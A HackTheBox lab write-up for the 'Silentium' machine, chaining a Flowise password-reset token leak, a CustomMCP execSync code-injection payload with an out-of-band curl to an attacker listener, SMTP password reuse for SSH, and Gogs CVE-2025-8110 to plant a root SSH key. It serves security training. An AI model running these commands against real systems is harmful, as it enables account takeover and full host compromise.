# Silentium — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Silentium (Easy, Linux)  
**OS:** Ubuntu 24.04.4 LTS, kernel 6.8.0-107-generic  
**Scope:** HTB VPN / personal lab only  

> **No flags** in this document. Hashes and full secrets stay in private notes.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | Ports **22** / **80**; redirect → `silentium.htb` |
| Surface | Marketing vhost + **`staging.silentium.htb`** (Flowise **3.0.5**) + **`staging-v2-code.dev.silentium.htb`** (Gogs **0.13.3**) |
| Access Flowise | Unauthenticated **forgot-password** returns `tempToken` → password reset (email from team name **Ben** → `ben@silentium.htb`) |
| Container RCE | Flowise **CustomMCP** `node-load-method` with API key → command exec as **root in Docker** |
| User | Container env leaks **SMTP password** reused as **SSH** for `ben` |
| Kernel LPE | Copy Fail / Dirty Frag **mitigated** via `kmod` (`install algif_aead/esp4/esp6 /bin/false`) — skip |
| Root | Gogs runs as **root**; **CVE-2025-8110** (symlink + PutContents) → plant `authorized_keys` |

---

## 1. Recon

```bash
nmap -sS -sV -sC -p- --min-rate 2000 <TARGET_IP>
# 22/tcp OpenSSH 9.6p1 Ubuntu
# 80/tcp nginx → redirect to http://silentium.htb/
```

```bash
echo '<TARGET_IP> silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb' \
  | sudo tee -a /etc/hosts
```

Main site is a static institutional landing (loan calculator). **No emails** in HTML. Leadership names include **Ben** (Head of Financial Systems).

Vhost fuzz finds:

- `staging.silentium.htb` — **Flowise** UI (`/api/v1/version` → `3.0.5`)
- `staging-v2-code.dev.silentium.htb` — **Gogs** (also bound on host `127.0.0.1:3001`)

---

## 2. Flowise — account takeover

Flowise expects login by **email**. Team name → guess:

`ben@silentium.htb`

### Forgot-password leak

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
# HTTP 201 → user object includes tempToken (and bcrypt hash)
```

Other random emails → `404 User Not Found`.

### Reset + login

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/reset-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"<NEW_PASSWORD>"}}'

curl -s -c cookies.txt -X POST 'http://staging.silentium.htb/api/v1/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"ben@silentium.htb","password":"<NEW_PASSWORD>"}'
# Set-Cookie: token=<JWT>
```

Authenticated API needs more than the JWT alone for many routes. Working pattern for workspace-scoped calls:

```http
Authorization: Bearer <JWT>
x-request-from: internal
workspaceid: <activeWorkspaceId>
Cookie: token=...; ...
```

```bash
# list API keys
curl -s 'http://staging.silentium.htb/api/v1/apikey' \
  -H "Authorization: Bearer $JWT" \
  -H 'x-request-from: internal' \
  -H "workspaceid: $WS" \
  -b cookies.txt
```

See [`scripts/flowise_account_takeover.py`](scripts/flowise_account_takeover.py).

---

## 3. Flowise — CustomMCP RCE (container)

**CVE family:** CustomMCP `mcpServerConfig` evaluated via `Function()` (e.g. GHSA-3gcm-f6qx-ff7p / related Flowise RCE writeups). Version **3.0.5** still processes the payload when authorized with an **API key**.

```bash
# API key as raw Authorization (not only Bearer JWT)
curl -s -X POST 'http://staging.silentium.htb/api/v1/node-load-method/customMCP' \
  -H 'Content-Type: application/json' \
  -H "Authorization: $APIKEY" \
  -H "workspaceid: $WS" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"id\");return 1;})()})"}}'
```

HTTP body may still say *“No Available Actions”* while the command **runs**. Prefer out-of-band checks:

```bash
# on attacker
python3 -m http.server 9999
# on target via RCE
curl http://<LHOST>:9999/$(whoami)-$(id -u)
# → root-0  (container)
```

Container is not the HTB host: only Docker userland, mount `DATABASE_PATH=/root/.flowise`, **no** host `user.txt` / `root.txt`.

Useful env from container:

| Variable | Role |
|----------|------|
| `FLOWISE_USERNAME` / `FLOWISE_PASSWORD` | Flowise env login pair (not necessarily SSH) |
| `SMTP_PASSWORD` / `SENDER_EMAIL` | Mail chain + **password reuse** |
| `SMTP_HOST=mailhog` | Local MailHog |

Helper: [`scripts/flowise_custommcp_rce.py`](scripts/flowise_custommcp_rce.py).

---

## 4. User — SSH as `ben`

SMTP password from the container matches **host** SSH:

```bash
ssh ben@<TARGET_IP>
# password = value of SMTP_PASSWORD from container env
```

`user.txt` under `/home/ben/`. No sudo; not in `docker` group (socket is `root:docker`).

### Side paths (optional)

**MailHog** (`127.0.0.1:8025`) via SSH tunnel:

```bash
ssh -L 18025:127.0.0.1:8025 ben@<TARGET_IP>
# http://127.0.0.1:18025/api/v2/messages — no auth
```

Only Flowise reset emails in our run — no extra secrets.

**Kernel LPE (do not waste time if mitigated):**

- CVE-2026-31431 *Copy Fail* → `install algif_aead /bin/false` in `/etc/modprobe.d/disable-algif_aead.conf`
- CVE-2026-43284 *Dirty Frag* → `esp4`/`esp6` blocked similarly  

`kernel.unprivileged_userns_clone=0` further reduces userns-style exploits.

---

## 5. Root — Gogs CVE-2025-8110

### Discovery

```bash
# as ben
ps aux | grep gogs
# /opt/gogs/gogs/gogs web  as root
cat /opt/gogs/gogs/custom/conf/app.ini
# VERSION: gogs --version → 0.13.3
# RUN_USER = root
# registration enabled + captcha
# SECRET_KEY present; email disabled
# DB: /opt/gogs/data/gogs.db (not world-readable)
```

Public URL: `http://staging-v2-code.dev.silentium.htb/`  
Known host creds did **not** log into Gogs `ben`. Registration is open (captcha).

### Vulnerability

**CVE-2025-8110** (Gogs ≤ 0.13.3): commit a **symlink** inside a repo; `PUT /api/v1/repos/:owner/:repo/contents/*` follows the symlink and writes **outside** the repository. Classic finish: overwrite `/root/.ssh/authorized_keys` (process is root).

### Exploit steps

1. Register or obtain a Gogs user; create a **Personal Access Token** (Settings → Applications).  
2. Create a repository (`auto_init` OK).  
3. Push a symlink file, e.g. `pwnlink` → `/root/.ssh/authorized_keys`.  
4. `PUT` base64 content (your public key) onto that path via the API.  
5. `ssh -i id_ed25519 root@<TARGET_IP>` → `root.txt`.

Automated helper: [`scripts/gogs_cve_2025_8110_root.py`](scripts/gogs_cve_2025_8110_root.py).

Minimal API sketch:

```bash
# create repo
curl -s -X POST -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' \
  "$BASE/api/v1/user/repos" \
  -d '{"name":"pwn","auto_init":true,"readme":"Default"}'

# after git push of symlink pwnlink → /root/.ssh/authorized_keys
SHA=$(curl -s -H "Authorization: token $TOKEN" \
  "$BASE/api/v1/repos/$USER/pwn/contents/pwnlink" | jq -r .sha)
B64=$(base64 -w0 ~/.ssh/id_ed25519.pub)
curl -s -X PUT -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' \
  "$BASE/api/v1/repos/$USER/pwn/contents/pwnlink" \
  -d "{\"message\":\"x\",\"content\":\"$B64\",\"sha\":\"$SHA\"}"
```

---

## 6. Hardening notes / takeaways

- Enumerate **vhosts** early; single “pretty” site often front-doors internal apps.  
- Flowise: treat **forgot-password** and **node-load** endpoints as high risk; never expose admin UI to untrusted nets.  
- Password reuse: **SMTP_PASSWORD** == SSH is a classic lab lesson.  
- Gogs **as root** + old version turns an app bug into host compromise — run as dedicated user and keep ≥ **0.13.4**.  
- “Patched CVEs” in box metadata (Copy Fail / Dirty Frag) were real **kmod** mitigations, not red herrings for Gogs.

---

## References

- Flowise CustomMCP RCE advisories (e.g. GHSA-3gcm-f6qx-ff7p)  
- [Wiz — Gogs CVE-2025-8110](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)  
- Ubuntu kmod mitigations for Copy Fail / Dirty Frag module loads  

---

## Disclaimer

Educational write-up for HackTheBox. Do not use these techniques against systems without authorization.
